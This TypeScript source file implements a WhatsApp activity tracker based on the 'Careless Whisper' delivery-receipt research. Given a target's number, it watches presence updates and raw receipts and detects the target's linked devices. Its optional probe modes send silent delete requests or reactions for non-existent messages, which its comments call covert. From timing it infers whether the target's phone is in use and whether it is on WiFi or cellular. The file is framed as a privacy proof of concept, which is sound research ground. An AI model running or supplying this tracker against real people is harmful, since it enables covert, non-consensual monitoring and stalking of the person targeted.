import 'baileys';
import { WASocket, proto } from 'baileys';
import { randomUUID } from 'node:crypto';
import { pino } from 'pino';
import {
    CALIBRATING_STATE,
    getScopedPresenceEntries,
    isNoAckState,
    isTechnicalLidJid,
    jidBelongsToTarget,
    NO_ACK_STATE,
    ONLINE_STATE,
    STANDBY_STATE,
    type TrackerConnectionType,
    type TrackerProbeState,
    type TrackerUpdate,
} from './tracker-signals.js';
import { registerSyntheticProbeId } from './probe-messages.js';

// Suppress Baileys debug output (Closing session spam)
const logger = pino({
    level: process.argv.includes('--debug') ? 'debug' : 'silent'
});

/**
 * Probe method types
 * - 'passive': Observe real WhatsApp signals without generating traffic - DEFAULT
 * - 'delete': Silent delete probe (sends delete request for non-existent message)
 * - 'reaction': Reaction probe (sends reaction to non-existent message)
 */
export type ProbeMethod = 'passive' | 'delete' | 'reaction';

export interface TrackerProbeOptions {
    intervalMs?: number;
    timeoutMs?: number;
    maxBackoffMs?: number;
}

function boundedInteger(value: unknown, fallback: number, minimum: number, maximum: number): number {
    const parsed = Number(value);
    if (!Number.isFinite(parsed)) return fallback;
    return Math.min(maximum, Math.max(minimum, Math.floor(parsed)));
}

function newProbeEnvelopeId(): string {
    return `3EB0${randomUUID().replace(/-/g, '').slice(0, 20).toUpperCase()}`;
}

/**
 * Logger utility for debug and normal mode
 */
class TrackerLogger {
    private isDebugMode: boolean;

    constructor(debugMode: boolean = false) {
        this.isDebugMode = debugMode;
    }

    setDebugMode(enabled: boolean) {
        this.isDebugMode = enabled;
    }

    debug(...args: any[]) {
        if (this.isDebugMode) {
            console.log(...args);
        }
    }

    info(...args: any[]) {
        console.log(...args);
    }

    formatDeviceState(jid: string, rtt: number, avgRtt: number, median: number, threshold: number, state: string) {
        const stateColor = state === ONLINE_STATE ? '🟢' : state === STANDBY_STATE ? '🟡' : isNoAckState(state) ? '🟠' : '⚪';
        const timestamp = new Date().toLocaleTimeString('de-DE');

        // Box width is 64 characters, inner content is 62 characters (excluding ║ on both sides)
        const boxWidth = 62;

        const header = `${stateColor} Device Status Update - ${timestamp}`;
        const jidLine = `JID:        ${jid}`;
        const statusLine = `Status:     ${state}`;
        const rttLine = `RTT:        ${rtt}ms`;
        const avgLine = `Avg (3):    ${avgRtt.toFixed(0)}ms`;
        const medianLine = `Median:     ${median.toFixed(0)}ms`;
        const thresholdLine = `Threshold:  ${threshold.toFixed(0)}ms`;

        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
        console.log(`║ ${header.padEnd(boxWidth)} ║`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ ${jidLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${statusLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${rttLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${avgLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${medianLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${thresholdLine.padEnd(boxWidth)} ║`);
        console.log(`╚════════════════════════════════════════════════════════════════╝\n`);
    }
}

const trackerLogger = new TrackerLogger();

/**
 * Metrics tracked per device for activity monitoring
 */
interface DeviceMetrics {
    rttHistory: number[];      // Historical RTT measurements (up to 2000)
    recentRtts: number[];      // Recent RTTs for moving average (last 3)
    state: TrackerProbeState;  // Current device state (Online/Standby/Calibrating/NO_ACK)
    lastRtt: number;           // Most recent RTT measurement
    lastUpdate: number;        // Timestamp of last update
}

/**
 * WhatsAppTracker - Monitors messaging app user activity using RTT-based analysis
 *
 * This class implements a privacy research proof-of-concept that demonstrates
 * how messaging apps can leak user activity information through network timing.
 *
 * The tracker sends probe messages and measures Round-Trip Time (RTT) to detect
 * when a user's device is actively in use vs. in standby mode.
 *
 * Works with WhatsApp, Signal, and similar messaging platforms.
 *
 * Based on research: "Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users"
 * by Gegenhuber et al., University of Vienna & SBA Research
 */
export class WhatsAppTracker {
    private sock: WASocket;
    private targetJid: string;
    private trackedJids: Set<string> = new Set(); // Multi-device support
    private isTracking: boolean = false;
    private deviceMetrics: Map<string, DeviceMetrics> = new Map();
    private globalRttHistory: number[] = []; // For threshold calculation
    private probeStartTimes: Map<string, number> = new Map();
    private probeTimeouts: Map<string, NodeJS.Timeout> = new Map();
    private lastPresence: string | null = null;
    private probeMethod: ProbeMethod = 'passive';
    private readonly probeIntervalMs: number;
    private readonly probeTimeoutMs: number;
    private readonly maxProbeBackoffMs: number;
    private consecutiveNoAck: number = 0;
    private readonly trackerRef = randomUUID().slice(0, 8);
    private knownDeviceJids: Set<string> = new Set(); // Track known device JIDs for alerts
    private messagesUpdateHandler: ((updates: any[]) => void) | null = null;
    private rawReceiptHandler: ((node: any) => void) | null = null;
    private presenceUpdateHandler: ((update: any) => void) | null = null;
    private probeLoopTimer: NodeJS.Timeout | null = null;
    private probeLoopWake: (() => void) | null = null;
    public onUpdate?: (data: TrackerUpdate) => void;
    public onPresenceChange?: (data: { jid: string; presence: string; timestamp: number }) => void;
    public onNewDevice?: (data: { deviceJid: string; targetJid: string; totalDevices: number; timestamp: number }) => void;

    constructor(
        sock: WASocket,
        targetJid: string,
        debugMode: boolean = false,
        probeOptions: TrackerProbeOptions = {},
    ) {
        this.sock = sock;
        this.targetJid = targetJid;
        this.trackedJids.add(targetJid);
        this.knownDeviceJids.add(targetJid);
        this.probeIntervalMs = boundedInteger(probeOptions.intervalMs, 30_000, 10_000, 10 * 60_000);
        this.probeTimeoutMs = boundedInteger(probeOptions.timeoutMs, 10_000, 3_000, 60_000);
        this.maxProbeBackoffMs = boundedInteger(probeOptions.maxBackoffMs, 5 * 60_000, this.probeIntervalMs, 30 * 60_000);
        trackerLogger.setDebugMode(debugMode);
    }

    public setProbeMethod(method: ProbeMethod) {
        this.probeMethod = method;
        if (method === 'passive') this.clearPendingProbes();
        this.wakeProbeLoop();
        trackerLogger.info(`\n🔄 Tracking mode changed to: ${method === 'passive' ? 'Passive' : method === 'delete' ? 'Experimental Delete' : 'Experimental Reaction'}\n`);
    }

    public getProbeMethod(): ProbeMethod {
        return this.probeMethod;
    }

    /**
     * Start tracking the target user's activity
     * Sets up event listeners for message receipts and presence updates
     */
    public async startTracking() {
        if (this.isTracking) return;
        this.isTracking = true;
        trackerLogger.info(`\n✅ Tracking started [${this.trackerRef}]`);
        trackerLogger.info(`Tracking mode: ${this.probeMethod === 'passive' ? 'Passive' : `Experimental ${this.probeMethod}`}\n`);

        // Listen for message updates (receipts)
        this.messagesUpdateHandler = (updates: any[]) => {
            for (const update of updates) {
                // Check if update is from any of the tracked JIDs (multi-device support)
                if (update.key.remoteJid
                    && jidBelongsToTarget(update.key.remoteJid, this.targetJid, this.trackedJids)
                    && update.key.fromMe) {
                    this.analyzeUpdate(update);
                }
            }
        };
        this.sock.ev.on('messages.update', this.messagesUpdateHandler);

        // Listen for raw receipts to catch 'inactive' type which are ignored by Baileys
        this.rawReceiptHandler = (node: any) => {
            this.handleRawReceipt(node);
        };
        this.sock.ws.on('CB:receipt', this.rawReceiptHandler);

        // Listen for presence updates
        this.presenceUpdateHandler = (update: any) => {
            trackerLogger.debug(`[PRESENCE] Update received [${this.trackerRef}]`);

            const scopedPresences = getScopedPresenceEntries(update, this.targetJid, this.trackedJids);
            for (const [jid, presenceData] of scopedPresences) {
                // Baileys may emit @lid identifiers for the same account/session.
                // They are useful internally but should not be shown as physical devices.
                const isDisplayableDevice = !isTechnicalLidJid(jid);

                if (isDisplayableDevice && !this.knownDeviceJids.has(jid)) {
                    this.knownDeviceJids.add(jid);
                    trackerLogger.info(`[TRACKING] Additional technical destination observed [${this.trackerRef}]`);
                    if (this.onNewDevice) {
                        this.onNewDevice({
                            deviceJid: jid,
                            targetJid: this.targetJid,
                            totalDevices: this.knownDeviceJids.size,
                            timestamp: Date.now()
                        });
                    }
                }

                // Track technical JIDs internally so presence/receipts remain correlated.
                this.trackedJids.add(jid);
                trackerLogger.debug(`[TRACKING] Technical destination correlated [${this.trackerRef}]`);

                const newPresence = presenceData.lastKnownPresence;
                const prevPresence = this.lastPresence;
                this.lastPresence = newPresence;
                trackerLogger.debug(`[PRESENCE] State stored [${this.trackerRef}]: ${this.lastPresence}`);

                // Emit presence change for composing/recording/available/unavailable
                if (this.onPresenceChange && newPresence !== prevPresence) {
                    this.onPresenceChange({
                        jid: this.targetJid,
                        presence: newPresence,
                        timestamp: Date.now()
                    });
                }
                break;
            }
        };
        this.sock.ev.on('presence.update', this.presenceUpdateHandler);

        // Subscribe to presence updates
        try {
            await this.sock.presenceSubscribe(this.targetJid);
            trackerLogger.debug(`[PRESENCE] Subscription active [${this.trackerRef}]`);
        } catch (err) {
            trackerLogger.debug('[PRESENCE] Error subscribing to presence:', err);
        }

        // Send initial state update
        if (this.onUpdate) {
            this.onUpdate({
                sampleKind: 'initial',
                devices: [],
                deviceCount: this.deviceMetrics.size,
                presence: this.lastPresence,
                connectionType: null,
                median: 0,
                threshold: 0
            });
        }

        // Start the probe loop
        this.probeLoop();
    }

    private async probeLoop() {
        while (this.isTracking) {
            if (this.probeMethod !== 'passive' && this.probeStartTimes.size === 0) {
                try {
                    await this.sendProbe();
                } catch (err) {
                    logger.error(err, 'Error sending probe');
                }
            }
            const backoffMultiplier = this.probeMethod === 'passive'
                ? 1
                : 2 ** Math.min(this.consecutiveNoAck, 4);
            const delay = this.probeMethod === 'passive'
                ? this.probeIntervalMs
                : Math.min(this.maxProbeBackoffMs, this.probeIntervalMs * backoffMultiplier);
            await this.waitForProbeLoop(delay);
        }
    }

    private waitForProbeLoop(delay: number): Promise<void> {
        return new Promise(resolve => {
            let settled = false;
            const done = () => {
                if (settled) return;
                settled = true;
                if (this.probeLoopTimer) clearTimeout(this.probeLoopTimer);
                if (this.probeLoopWake === done) this.probeLoopWake = null;
                this.probeLoopTimer = null;
                resolve();
            };
            this.probeLoopWake = done;
            this.probeLoopTimer = setTimeout(done, delay);
        });
    }

    private wakeProbeLoop(): void {
        this.probeLoopWake?.();
    }

    private async sendProbe() {
        if (this.probeMethod === 'passive') return;
        if (this.probeMethod === 'delete') {
            await this.sendDeleteProbe();
        } else {
            await this.sendReactionProbe();
        }
    }

    /**
     * Send a delete probe - completely silent/covert method
     * Sends a "delete" command for a non-existent message
     */
    private async sendDeleteProbe() {
        let pendingEnvelopeId: string | null = null;
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)] ?? '3EB0';
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            const randomDeleteMessage = {
                delete:{
                    remoteJid: this.targetJid,
                    fromMe: true,
                    id: randomMsgId,
                }
            };

            trackerLogger.debug(
                `[PROBE-DELETE] Sending experimental probe [${this.trackerRef}]`
            );
            const envelopeId = newProbeEnvelopeId();
            pendingEnvelopeId = envelopeId;
            registerSyntheticProbeId(randomMsgId);
            registerSyntheticProbeId(envelopeId);
            const startTime = Date.now();
            this.probeStartTimes.set(envelopeId, startTime);

            const result = await this.sock.sendMessage(this.targetJid, randomDeleteMessage, { messageId: envelopeId });

            if (result?.key?.id) {
                registerSyntheticProbeId(result.key.id);
                if (result.key.id !== envelopeId) {
                    this.probeStartTimes.delete(envelopeId);
                    this.probeStartTimes.set(result.key.id, startTime);
                    pendingEnvelopeId = result.key.id;
                }
                trackerLogger.debug(`[PROBE-DELETE] Probe accepted [${this.trackerRef}]`);

                // No CLIENT ACK is inconclusive: record NO_ACK rather than claiming disconnection.
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-DELETE TIMEOUT] No client confirmation [${this.trackerRef}] after ${elapsedTime}ms`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        if (result.key.remoteJid) {
                            this.markDeviceNoAck(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, this.probeTimeoutMs);

                if (this.probeStartTimes.has(result.key.id)) {
                    this.probeTimeouts.set(result.key.id, timeoutId);
                } else {
                    clearTimeout(timeoutId);
                }
            } else {
                this.probeStartTimes.delete(envelopeId);
                trackerLogger.debug('[PROBE-DELETE ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            if (pendingEnvelopeId) this.probeStartTimes.delete(pendingEnvelopeId);
            logger.error(err, '[PROBE-DELETE ERROR] Failed to send delete probe message');
        }
    }

    /**
     * Send a reaction probe - original method
     * Uses a reaction to a non-existent message to minimize user disruption
     */
    private async sendReactionProbe() {
        let pendingEnvelopeId: string | null = null;
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            // Randomize reaction emoji
            const reactions = ['👍', '❤️', '😂', '😮', '😢', '🙏', '👻', '🔥', '✨', ''];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)] ?? '';

            const reactionMessage = {
                react: {
                    text: randomReaction,
                    key: {
                        remoteJid: this.targetJid,
                        fromMe: false,
                        id: randomMsgId
                    }
                }
            };

            trackerLogger.debug(`[PROBE-REACTION] Sending experimental probe [${this.trackerRef}]`);
            const envelopeId = newProbeEnvelopeId();
            pendingEnvelopeId = envelopeId;
            registerSyntheticProbeId(randomMsgId);
            const startTime = Date.now();
            registerSyntheticProbeId(envelopeId);
            this.probeStartTimes.set(envelopeId, startTime);
            const result = await this.sock.sendMessage(this.targetJid, reactionMessage, { messageId: envelopeId });

            if (result?.key?.id) {
                registerSyntheticProbeId(result.key.id);
                if (result.key.id !== envelopeId) {
                    this.probeStartTimes.delete(envelopeId);
                    this.probeStartTimes.set(result.key.id, startTime);
                    pendingEnvelopeId = result.key.id;
                }
                trackerLogger.debug(`[PROBE-REACTION] Probe accepted [${this.trackerRef}]`);

                // No CLIENT ACK is inconclusive: record NO_ACK rather than claiming disconnection.
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        trackerLogger.debug(`[PROBE-REACTION TIMEOUT] No client confirmation [${this.trackerRef}] after ${elapsedTime}ms`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);

                        if (result.key.remoteJid) {
                            this.markDeviceNoAck(result.key.remoteJid, elapsedTime);
                        }
                    }
                }, this.probeTimeoutMs);

                if (this.probeStartTimes.has(result.key.id)) {
                    this.probeTimeouts.set(result.key.id, timeoutId);
                } else {
                    clearTimeout(timeoutId);
                }
            } else {
                this.probeStartTimes.delete(envelopeId);
                trackerLogger.debug('[PROBE-REACTION ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            if (pendingEnvelopeId) this.probeStartTimes.delete(pendingEnvelopeId);
            logger.error(err, '[PROBE-REACTION ERROR] Failed to send probe message');
        }
    }

    /**
     * Handle raw receipt nodes directly from the websocket
     * This is necessary because Baileys ignores receipts with type="inactive"
     */
    private handleRawReceipt(node: any) {
        try {
            const { attrs } = node;
            // We only care about 'inactive' receipts here
            if (attrs.type === 'inactive') {
                trackerLogger.debug(`[RAW RECEIPT] Inactive receipt observed [${this.trackerRef}]`);

                const msgId = attrs.id;
                const fromJid = attrs.from;

                // Guard against missing from attribute
                if (!fromJid) {
                    trackerLogger.debug('[RAW RECEIPT] Missing from JID in receipt');
                    return;
                }

                if (jidBelongsToTarget(fromJid, this.targetJid, this.trackedJids)) {
                    this.processAck(msgId, fromJid, 'inactive');
                }
            }
        } catch (err) {
            trackerLogger.debug(`[RAW RECEIPT] Error handling receipt: ${err}`);
        }
    }

    /**
     * Process an ACK (receipt) from a device
     */
    private processAck(msgId: string, fromJid: string, type: string) {
        trackerLogger.debug(`[ACK PROCESS] ${type} [${this.trackerRef}]`);

        if (!msgId || !fromJid) return;

        // Check if this is one of our probes
        const startTime = this.probeStartTimes.get(msgId);

        if (startTime) {
            const rtt = Date.now() - startTime;
            trackerLogger.debug(`[TRACKING] ✅ ${type.toUpperCase()} [${this.trackerRef}], RTT: ${rtt}ms`);

            // Clear timeout
            const timeoutId = this.probeTimeouts.get(msgId);
            if (timeoutId) {
                clearTimeout(timeoutId);
                this.probeTimeouts.delete(msgId);
            }

            this.probeStartTimes.delete(msgId);
            this.consecutiveNoAck = 0;
            this.addMeasurementForDevice(fromJid, rtt);
        }
    }

    /**
     * Analyze message update and calculate RTT
     * @param update Message update from WhatsApp
     */
    private analyzeUpdate(update: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }) {
        const status = update.update.status;
        const msgId = update.key.id;
        const fromJid = update.key.remoteJid;

        if (!msgId || !fromJid) return;

        trackerLogger.debug(`[TRACKING] Message status [${this.trackerRef}]: ${status} (${this.getStatusName(status)})`);

        // Delivery/read/played all prove that the target device received it.
        // SERVER ACK (2) only means server received it, not the device
        if (typeof status === 'number' && status >= 3 && status <= 5) {
            this.processAck(msgId, fromJid, 'client_ack');
        }
    }

    private getStatusName(status: number | null | undefined): string {
        switch (status) {
            case 0: return 'ERROR';
            case 1: return 'PENDING';
            case 2: return 'SERVER_ACK';
            case 3: return 'DELIVERY_ACK';
            case 4: return 'READ';
            case 5: return 'PLAYED';
            default: return 'UNKNOWN';
        }
    }

    /**
     * Record an inconclusive NO_ACK result when no CLIENT ACK is received.
     * @param jid Device JID
     * @param timeout Time elapsed before timeout
     */
    private markDeviceNoAck(jid: string, timeout: number) {
        this.consecutiveNoAck += 1;
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: NO_ACK_STATE,
                lastRtt: timeout,
                lastUpdate: Date.now()
            });
        } else {
            const metrics = this.deviceMetrics.get(jid)!;
            metrics.state = NO_ACK_STATE;
            metrics.lastRtt = timeout;
            metrics.lastUpdate = Date.now();
        }

        trackerLogger.info(`\n🟠 No client confirmation [${this.trackerRef}] after ${timeout}ms (inconclusive)\n`);
        this.sendUpdate();
    }

    /**
     * Add RTT measurement for a specific device and update its state
     * @param jid Device JID
     * @param rtt Round-trip time in milliseconds
     */
    private addMeasurementForDevice(jid: string, rtt: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: CALIBRATING_STATE,
                lastRtt: rtt,
                lastUpdate: Date.now()
            });
        }

        const metrics = this.deviceMetrics.get(jid)!;

        // Only add measurements if we actually received a CLIENT ACK (rtt <= 5000ms)
        if (rtt <= 5000) {
            // 1. Add to device's recent RTTs for moving average (last 3)
            metrics.recentRtts.push(rtt);
            if (metrics.recentRtts.length > 3) {
                metrics.recentRtts.shift();
            }

            // 2. Add to device's history for calibration (last 2000), filtering outliers > 5000ms
            metrics.rttHistory.push(rtt);
            if (metrics.rttHistory.length > 2000) {
                metrics.rttHistory.shift();
            }

            // 3. Add to global history for global threshold calculation
            this.globalRttHistory.push(rtt);
            if (this.globalRttHistory.length > 2000) {
                this.globalRttHistory.shift();
            }

            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();

            // Determine new state based on RTT
            this.determineDeviceState(jid);
        }
        // A timeout is recorded separately as NO_ACK by markDeviceNoAck().

        this.sendUpdate();
    }

    /**
     * Determine device state (Online/Standby/NO_ACK) based on RTT analysis
     * @param jid Device JID
     */
    private determineDeviceState(jid: string) {
        const metrics = this.deviceMetrics.get(jid);
        if (!metrics) return;
        if (metrics.recentRtts.length === 0) {
            metrics.state = CALIBRATING_STATE;
            return;
        }

        // If the previous observation had no ACK, a real ACK can restore classification.
        // Only change back to Online/Standby if we receive new measurements
        if (isNoAckState(metrics.state)) {
            // Check if this is a new measurement (device came back online)
            if (metrics.lastRtt <= 5000 && metrics.recentRtts.length > 0) {
                trackerLogger.debug(`[TRACKING ${this.trackerRef}] Confirmation restored (RTT: ${metrics.lastRtt}ms)`);
                // Continue with normal state determination below
            } else {
                trackerLogger.debug(`[TRACKING ${this.trackerRef}] Maintaining inconclusive state`);
                return;
            }
        }

        // Calculate device's moving average
        const movingAvg = metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length;

        // Calculate global median and threshold
        let median = 0;
        let threshold = 0;

        if (this.globalRttHistory.length >= 3) {
            const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
            const mid = Math.floor(sorted.length / 2);
            median = sorted.length % 2 !== 0
                ? (sorted[mid] ?? 0)
                : ((sorted[mid - 1] ?? 0) + (sorted[mid] ?? 0)) / 2;


            threshold = median * 0.9;

            if (movingAvg < threshold) {
                metrics.state = ONLINE_STATE;
            } else {
                metrics.state = STANDBY_STATE;
            }
        } else {
            metrics.state = CALIBRATING_STATE;
        }

        // Normal mode: Formatted output
        trackerLogger.formatDeviceState(`target-${this.trackerRef}`, metrics.lastRtt, movingAvg, median, threshold, metrics.state);

        // Debug mode: Additional debug information
        trackerLogger.debug(`[DEBUG] RTT History length: ${metrics.rttHistory.length}, Global History: ${this.globalRttHistory.length}`);
    }

    /**
     * Send update to client with current tracking data
     */
    private sendUpdate() {
        // Build devices array
        const devices = Array.from(this.deviceMetrics.entries()).map(([jid, metrics]) => ({
            jid,
            state: metrics.state,
            rtt: metrics.lastRtt,
            avg: metrics.recentRtts.length > 0
                ? metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length
                : 0
        }));

        // Calculate global stats for backward compatibility
        const globalMedian = this.calculateGlobalMedian();
        const globalThreshold = globalMedian * 0.9;

        const data: TrackerUpdate = {
            sampleKind: 'probe' as const,
            devices,
            deviceCount: devices.length,
            presence: this.lastPresence,
            connectionType: this.inferConnectionType(),
            // Global stats for charts
            median: globalMedian,
            threshold: globalThreshold
        };

        if (this.onUpdate) {
            this.onUpdate(data);
        }
    }

    /**
     * Infer WiFi vs Cellular connection based on RTT patterns.
     * WiFi: low RTT, low variance. Cellular: higher RTT, high variance.
     */
    private inferConnectionType(): TrackerConnectionType {
        if (this.globalRttHistory.length < 10) return 'unknown';
        const recent = this.globalRttHistory.slice(-10);
        const avg = recent.reduce((a, b) => a + b, 0) / recent.length;
        if (avg === 0) return 'unknown';
        const variance = recent.reduce((sum, r) => sum + Math.pow(r - avg, 2), 0) / recent.length;
        const cv = Math.sqrt(variance) / avg; // coefficient of variation

        if (avg < 350 && cv < 0.3) return 'wifi';
        if (avg > 600 || cv > 0.5) return 'cellular';
        return 'unknown';
    }

    /**
     * Calculate global median RTT across all measurements
     * @returns Median RTT value
     */
    private calculateGlobalMedian(): number {
        if (this.globalRttHistory.length < 3) return 0;

        const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        return sorted.length % 2 !== 0
            ? (sorted[mid] ?? 0)
            : ((sorted[mid - 1] ?? 0) + (sorted[mid] ?? 0)) / 2;
    }

    /**
     * Get profile picture URL for the target user
     * @returns Profile picture URL or null if not available
     */
    public async getProfilePicture() {
        try {
            return await this.sock.profilePictureUrl(this.targetJid, 'image');
        } catch (err) {
            return null;
        }
    }

    /**
     * Stop tracking and clean up resources
     */
    public stopTracking() {
        this.isTracking = false;
        this.wakeProbeLoop();

        if (this.messagesUpdateHandler) {
            (this.sock.ev as any).off?.('messages.update', this.messagesUpdateHandler);
            this.messagesUpdateHandler = null;
        }
        if (this.rawReceiptHandler) {
            (this.sock.ws as any).off?.('CB:receipt', this.rawReceiptHandler);
            this.rawReceiptHandler = null;
        }
        if (this.presenceUpdateHandler) {
            (this.sock.ev as any).off?.('presence.update', this.presenceUpdateHandler);
            this.presenceUpdateHandler = null;
        }

        // Clear all pending timeouts
        this.clearPendingProbes();

        logger.info('Stopping tracking');
    }

    private clearPendingProbes(): void {
        for (const timeoutId of this.probeTimeouts.values()) clearTimeout(timeoutId);
        this.probeTimeouts.clear();
        this.probeStartTimes.clear();
        this.consecutiveNoAck = 0;
    }
}
